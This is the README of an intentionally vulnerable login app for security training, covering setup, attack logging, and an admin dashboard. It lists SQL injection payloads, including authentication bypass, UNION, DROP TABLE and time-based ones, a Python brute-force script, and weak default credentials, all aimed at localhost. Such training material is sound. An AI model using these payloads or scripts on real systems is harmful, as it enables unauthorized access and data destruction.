# Vulnerable Login - Professional Security Training Platform 🛡️

⚠️ **WARNING: This application is INTENTIONALLY VULNERABLE for educational purposes only!**

## Overview

Professional-grade security training application featuring advanced animations, comprehensive attack logging, and detailed forensics capabilities. Designed for security professionals, penetration testers, and students to practice:

- **SQL Injection attacks** - Multiple techniques and payloads
- **Brute force attacks** - Dictionary, parallel, and credential stuffing
- **Attack detection** - Real-time monitoring and analysis
- **Log analysis** - Comprehensive forensics and pattern recognition
- **Penetration testing** - Professional attack scripts and methodologies

## ✨ Premium Features

### 🎨 Professional UI/UX & Animations
- **Particle background** with dynamic connected nodes
- **Animated gradients** with smooth color transitions
- **Glass morphism** effects with backdrop blur
- **3D transforms** and perspective effects
- **Micro-interactions** on all interactive elements
- **Smooth page transitions** with Framer Motion
- **Animated statistics** with counting effects
- **Hover effects** with lift, glow, and scale
- **Loading states** with shimmer and pulse
- **Staggered reveals** for content sections
- **Floating animations** for icons and badges
- **Gradient text** with animated shifts
- **Border glow** effects on focus
- **Ripple effects** on clicks

### 🔍 Advanced Filtering & Search
- **Full-text search** across all log fields
- **Attack type filtering** (SQL Injection, Brute Force, Normal Login, Credential Stuffing)
- **Status filtering** (Success/Failed attempts)
- **IP address filtering** with partial matching
- **Date range filtering** (From/To dates with calendar picker)
- **Real-time filtering** with instant results
- **Filter summary** showing matched vs total logs
- **Clear all filters** with one click
- **Export filtered results** to JSON with timestamp
- **Persistent filter state** during session

### 📁 Professional Logging System

All attacks are logged to multiple files with **complete field information**:

**Log Files Created:**
- `logs/attacks.log` - All attacks in one file
- `logs/attacks-YYYY-MM-DD.log` - Daily attack logs
- `logs/sql_injection.log` - SQL injection attacks only
- `logs/brute_force.log` - Brute force attacks only
- `logs/critical-attacks.log` - Successful attacks only
- `logs/security-events.log` - Security events
- `logs/security-YYYY-MM-DD.log` - Daily security events

**Log Format** (Clean and Professional):
\`\`\`
================================================================================
[2025-01-15T10:30:45.123Z] CRITICAL - ATTACK_ATTEMPT
================================================================================
ID                       : 42
IP ADDRESS               : 192.168.1.100
USERNAME ATTEMPT         : admin' OR '1'='1
PASSWORD ATTEMPT         : anything
ATTACK TYPE              : sql_injection
SUCCESS                  : YES
SQL QUERY                : SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
ERROR MESSAGE            : N/A
USER AGENT               : Mozilla/5.0 (X11; Linux x86_64)...
REQUEST METHOD           : POST
REQUEST HEADERS          : {"content-type":"application/json"}
GEO LOCATION             : N/A
DEVICE FINGERPRINT       : N/A
SESSION ID               : sess_abc123xyz
REFERER                  : http://localhost:3000/
RESPONSE TIME MS         : 45
PAYLOAD SIZE             : 256
ADDITIONAL DATA          : N/A
================================================================================
\`\`\`

**Log Features:**
- ✅ **All fields included** - Every database field is written to logs
- ✅ **Clean formatting** - Easy to read with clear labels and separators
- ✅ **Automatic rotation** - Files rotate at 10MB with timestamps
- ✅ **Multiple destinations** - Logs written to multiple files for easy filtering
- ✅ **Timestamped** - ISO 8601 format with milliseconds
- ✅ **Severity levels** - CRITICAL, ERROR, WARNING, INFO
- ✅ **Structured data** - JSON-compatible for parsing
- ✅ **Performance metrics** - Response time and payload size tracking

### 🗄️ Professional Database Structure

**Users Table** (18 comprehensive fields):
\`\`\`sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  password TEXT NOT NULL,
  email TEXT,
  full_name TEXT,
  phone TEXT,
  department TEXT,
  position TEXT,
  role TEXT DEFAULT 'user',
  account_status TEXT DEFAULT 'active',
  last_login DATETIME,
  failed_login_attempts INTEGER DEFAULT 0,
  account_locked BOOLEAN DEFAULT 0,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  password_changed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  two_factor_enabled BOOLEAN DEFAULT 0,
  security_question TEXT,
  security_answer TEXT
);
\`\`\`

**Attack Logs Table** (18 detailed fields):
\`\`\`sql
CREATE TABLE attack_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
  ip_address TEXT,
  username_attempt TEXT,
  password_attempt TEXT,
  attack_type TEXT,
  sql_query TEXT,
  success BOOLEAN,
  error_message TEXT,
  user_agent TEXT,
  request_method TEXT,
  request_headers TEXT,
  geo_location TEXT,
  device_fingerprint TEXT,
  session_id TEXT,
  referer TEXT,
  response_time_ms INTEGER,
  payload_size INTEGER,
  additional_data TEXT
);
\`\`\`

### 🎯 Intentional Vulnerabilities

1. **SQL Injection** - Raw SQL queries without parameterization
2. **No Rate Limiting** - Unlimited login attempts allowed
3. **No Account Lockout** - Failed attempts don't lock accounts
4. **No CAPTCHA** - Automated attacks possible
5. **Comprehensive Logging** - All attempts logged with full details

### 📚 Professional Attack Scripts

Located in `scripts/attack-examples.ts`:

- **Basic SQL Injection** - Authentication bypass techniques
- **UNION-based Injection** - Data extraction methods
- **Time-based Blind Injection** - Detection using delays
- **Dictionary Brute Force** - Common password testing
- **Parallel Brute Force** - Concurrent attack execution
- **Credential Stuffing** - Leaked credential testing
- **Password Mutations** - L33t speak and variations
- **Full Attack Suite** - Comprehensive testing framework

## Installation & Setup (Ubuntu/Linux)

### Prerequisites

\`\`\`bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Install Node.js 20+ (LTS recommended)
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Install build essentials (required for better-sqlite3)
sudo apt install -y build-essential python3

# Verify installation
node --version  # Should be v20.x or higher
npm --version   # Should be v10.x or higher
\`\`\`

### Installation Steps

\`\`\`bash
# 1. Clone or download the project
cd /path/to/sql-attack-login

# 2. Install dependencies
npm install

# 3. The application will automatically:
#    - Create vulnerable.db (SQLite database)
#    - Create logs/ directory
#    - Initialize database tables
#    - Insert default users

# 4. Verify directory structure
ls -la
# You should see:
# - vulnerable.db (created on first run)
# - logs/ (created on first run)
# - app/, components/, lib/, scripts/, styles/, etc.
\`\`\`

### Running the Application

\`\`\`bash
# Development mode (with hot reload)
npm run dev

# Production build
npm run build
npm start

# Custom port
PORT=3001 npm run dev

# The application will be available at:
# http://localhost:3000 (or your custom port)
\`\`\`

### Verifying Installation

\`\`\`bash
# Check if database was created
ls -lh vulnerable.db

# Check if logs directory exists
ls -la logs/

# Test the application
curl http://localhost:3000

# Make a test login to generate logs
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Check if logs were created
ls -la logs/
cat logs/attacks.log
\`\`\`

## Usage Guide

### Default Credentials

6 default users with detailed profiles:

\`\`\`
admin / admin123      (System Administrator, IT Department)
user / password       (Sales Representative, Sales Department)
john / john2024       (Software Engineer, Engineering Department)
sarah / sarah!pass    (Marketing Manager, Marketing Department)
mike / mike123        (Financial Analyst, Finance Department)
emma / emma2024       (HR Manager, HR Department)
\`\`\`

### SQL Injection Examples

#### 1. Basic Authentication Bypass
\`\`\`
Username: admin' OR '1'='1
Password: anything
\`\`\`

#### 2. Comment-based Bypass
\`\`\`
Username: admin'--
Password: (leave empty)
\`\`\`

#### 3. Always True Condition
\`\`\`
Username: ' OR 1=1--
Password: anything
\`\`\`

#### 4. UNION-based Injection
\`\`\`
Username: admin' UNION SELECT 1,'admin','password','admin@test.com','admin','active'--
Password: anything
\`\`\`

#### 5. Stacked Queries
\`\`\`
Username: admin'; DROP TABLE users--
Password: (leave empty)
\`\`\`

#### 6. Time-based Blind Injection
\`\`\`
Username: admin' AND SLEEP(5)--
Password: (leave empty)
\`\`\`

### Using the Admin Dashboard

1. **Navigate to** `http://localhost:3000/admin`

2. **View Animated Statistics**:
   - Total attack attempts (with counter animation)
   - SQL injection count (warning color)
   - Brute force attempts (destructive color)
   - Successful logins (primary color)

3. **Use Advanced Filters**:
   - Click "Filters" button to open filter panel
   - Search by username, IP, SQL query, or error message
   - Filter by attack type (SQL Injection, Brute Force, etc.)
   - Filter by status (Success/Failed)
   - Filter by IP address (partial matching supported)
   - Filter by date range (calendar picker)
   - See real-time results as you type
   - View filter summary (X of Y logs)
   - Clear all filters with one click

4. **Export Logs**:
   - Click "Export" button
   - Downloads filtered logs as JSON
   - Filename includes timestamp: `attack-logs-2025-01-15T10-30-45.json`

5. **Refresh Data**:
   - Click "Refresh" button to reload logs
   - Animated loading indicator with rotation

### Viewing Log Files

#### Real-time Log Monitoring

\`\`\`bash
# Watch all attacks in real-time
tail -f logs/attacks.log

# Watch today's attacks
tail -f logs/attacks-$(date +%Y-%m-%d).log

# Watch SQL injection attacks only
tail -f logs/sql_injection.log

# Watch critical (successful) attacks
tail -f logs/critical-attacks.log

# Watch security events
tail -f logs/security-events.log

# Watch multiple files simultaneously
tail -f logs/*.log
\`\`\`

#### Log Analysis Commands

\`\`\`bash
# Count total attacks
grep -c "ATTACK_ATTEMPT" logs/attacks.log

# Count successful attacks
grep -c "SUCCESS.*: YES" logs/attacks.log

# Find attacks from specific IP
grep "IP ADDRESS.*192.168.1.100" logs/attacks.log

# Find SQL injection attempts
grep "ATTACK TYPE.*sql_injection" logs/attacks.log

# Extract all attempted usernames
grep "USERNAME ATTEMPT" logs/attacks.log | cut -d: -f2 | sort | uniq

# Find attacks in last hour
find logs/ -name "*.log" -mmin -60 -exec tail -100 {} \;

# Search for specific SQL pattern
grep -i "OR '1'='1" logs/sql_injection.log

# Count attacks by type
grep "ATTACK TYPE" logs/attacks.log | sort | uniq -c

# Find all critical events
grep "CRITICAL" logs/*.log

# Get attack statistics
echo "Total attacks: $(grep -c 'ATTACK_ATTEMPT' logs/attacks.log)"
echo "Successful: $(grep -c 'SUCCESS.*: YES' logs/attacks.log)"
echo "Failed: $(grep -c 'SUCCESS.*: NO' logs/attacks.log)"
echo "SQL Injection: $(grep -c 'sql_injection' logs/attacks.log)"
echo "Brute Force: $(grep -c 'brute_force' logs/attacks.log)"
\`\`\`

#### Log Rotation

Logs automatically rotate when they reach 10MB:
\`\`\`bash
# Original log
logs/attacks.log

# Rotated logs (timestamped)
logs/attacks-2025-01-15T10-30-45-123Z.log
logs/attacks-2025-01-15T14-22-10-456Z.log
\`\`\`

### Professional Attack Scripts

#### Using the TypeScript Attack Suite

\`\`\`typescript
import { 
  basicSQLInjection,
  unionBasedSQLInjection,
  timeBasedSQLInjection,
  dictionaryBruteForce,
  parallelBruteForce,
  credentialStuffing,
  runFullAttackSuite
} from './scripts/attack-examples'

// Run individual attacks
await basicSQLInjection('http://localhost:3000')
await unionBasedSQLInjection('http://localhost:3000')
await dictionaryBruteForce('http://localhost:3000', 'admin')

// Run full attack suite
await runFullAttackSuite('http://localhost:3000')
\`\`\`

#### Python Brute Force Script

\`\`\`python
#!/usr/bin/env python3
import requests
import time
from datetime import datetime

url = "http://localhost:3000/api/login"
usernames = ["admin", "user", "john", "sarah", "mike", "emma"]
passwords = ["password", "123456", "admin123", "password123", "letmein"]

print(f"[{datetime.now()}] Starting brute force attack...")
print(f"Testing {len(usernames)} usernames with {len(passwords)} passwords")
print(f"Total attempts: {len(usernames) * len(passwords)}")
print("-" * 60)

successful = []
failed = []

for username in usernames:
    for password in passwords:
        try:
            response = requests.post(url, json={
                "username": username,
                "password": password
            }, timeout=5)
            
            data = response.json()
            status = "✓ SUCCESS" if data.get("success") else "✗ FAILED"
            
            print(f"{status} | {username:10} : {password:15} | {response.status_code}")
            
            if data.get("success"):
                successful.append(f"{username}:{password}")
            else:
                failed.append(f"{username}:{password}")
                
            time.sleep(0.1)  # Small delay to see logs clearly
            
        except Exception as e:
            print(f"ERROR | {username:10} : {password:15} | {str(e)}")

print("-" * 60)
print(f"\nResults:")
print(f"Successful: {len(successful)}")
print(f"Failed: {len(failed)}")
print(f"\nSuccessful credentials:")
for cred in successful:
    print(f"  - {cred}")
\`\`\`

## Troubleshooting

### Database Issues

\`\`\`bash
# Database locked error
rm vulnerable.db
npm run dev  # Will recreate

# Check database integrity
sqlite3 vulnerable.db "PRAGMA integrity_check;"

# View database schema
sqlite3 vulnerable.db ".schema"

# Count records
sqlite3 vulnerable.db "SELECT COUNT(*) FROM attack_logs;"

# View all users
sqlite3 vulnerable.db "SELECT username, role FROM users;"
\`\`\`

### Log File Issues

\`\`\`bash
# Logs not being created
mkdir -p logs
chmod 755 logs

# Check log file permissions
ls -la logs/

# Clear old logs
rm logs/*.log

# Check disk space
df -h

# Check if logs are being written
watch -n 1 'ls -lh logs/'
\`\`\`

### Port Issues

\`\`\`bash
# Port already in use
lsof -i :3000
kill -9 <PID>

# Or use different port
PORT=3001 npm run dev
\`\`\`

### Dependencies Issues

\`\`\`bash
# Clear and reinstall
rm -rf node_modules package-lock.json
npm install

# Rebuild native modules
npm rebuild better-sqlite3

# Check for errors
npm run build
\`\`\`

### Performance Issues

\`\`\`bash
# Check database size
ls -lh vulnerable.db

# Vacuum database
sqlite3 vulnerable.db "VACUUM;"

# Check log file sizes
du -sh logs/*

# Archive old logs
tar -czf logs-backup-$(date +%Y%m%d).tar.gz logs/*.log
rm logs/attacks-2025-*.log
\`\`\`

## Security Best Practices (NOT Implemented)

To secure a real application, implement:

1. ✅ **Parameterized queries** - Use prepared statements
2. ✅ **Password hashing** - bcrypt, argon2, or scrypt
3. ✅ **Rate limiting** - Limit attempts per IP/user
4. ✅ **Account lockout** - After N failed attempts
5. ✅ **CAPTCHA** - After 3-5 failed attempts
6. ✅ **Input validation** - Whitelist allowed characters
7. ✅ **HTTPS only** - Encrypt all traffic
8. ✅ **Session management** - Secure tokens with expiration
9. ✅ **MFA** - Multi-factor authentication
10. ✅ **Security headers** - CSP, HSTS, X-Frame-Options
11. ✅ **Error handling** - Don't expose sensitive info
12. ✅ **Logging** - Secure log storage and rotation
13. ✅ **Regular audits** - Penetration testing
14. ✅ **Principle of least privilege** - Minimal permissions

## Disclaimer

⚠️ **IMPORTANT LEGAL NOTICE**

This application is for **EDUCATIONAL PURPOSES ONLY**.

### DO NOT:
- ❌ Deploy to production
- ❌ Use with real data
- ❌ Attack unauthorized systems
- ❌ Use for malicious purposes
- ❌ Expose to public internet

### DO:
- ✅ Use on your own systems
- ✅ Use in authorized training
- ✅ Follow responsible disclosure
- ✅ Respect privacy laws

**Legal Warning:** Unauthorized access is illegal under CFAA and similar laws worldwide.

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Academy](https://portswigger.net/web-security)
- [SANS Institute](https://www.sans.org/)
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd University](https://www.bugcrowd.com/hackers/bugcrowd-university/)

## License

MIT License - Educational use only

---

**Remember:** Use this knowledge ethically and legally. With great power comes great responsibility. 🛡️
